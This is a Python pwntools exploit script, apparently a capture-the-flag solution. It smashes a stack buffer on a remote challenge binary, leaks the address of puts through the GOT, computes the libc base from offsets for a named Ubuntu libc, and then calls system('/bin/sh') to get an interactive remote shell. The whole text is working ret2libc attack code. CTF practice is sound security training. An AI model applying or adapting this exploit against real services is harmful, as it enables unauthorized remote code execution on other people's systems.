from pwn import * 


context.terminal = ["gnome-terminal", "-e"]
#0x00000000004011fb : pop rdi ; ret
sh = p64(0x4003ec)
gets_got = p64(0x404020)
_IO_puts = p64(0x404018)
fflush_got = p64(0x404028)
_puts_plt = p64(0x401030)
pop_rdi_ret = p64(0x4011FB)
offset = 0x28 * b"\xba"
main = p64(0x401179)
bin_sh_offset = 0x1b3e1a
system_offset = 0x04f550
ret = p64(0x401016)
_IO_offset = 0x080aa0

# turns out libc used is libc6_2.27-3ubuntu1.4_amd64


# stage 1 
payload = offset + pop_rdi_ret + _IO_puts + _puts_plt + main 



blah = remote("challenges.ctf.cert.rcts.pt",47637)
print(blah.recvline())
print(blah.recvline())
blah.sendline(payload)



_IO_address= u64(blah.readline()[:8].strip().ljust(8, b'\x00'))
libc_base = _IO_address - _IO_offset 
system_address = libc_base + system_offset 
str_bin_sh = libc_base + bin_sh_offset
print("_IO_puts address at % : "+hex(_IO_address))
print("libc base at % : "+hex(libc_base)) 
print("system_address at % "+hex(system_address))
print("str_bin_sh at % "+hex(str_bin_sh))

# stage 2 
print(blah.recvline())
print(blah.recvline()) 

payload = offset + ret+pop_rdi_ret + p64(str_bin_sh) + p64(system_address) 

blah.sendline(payload)
blah.interactive()
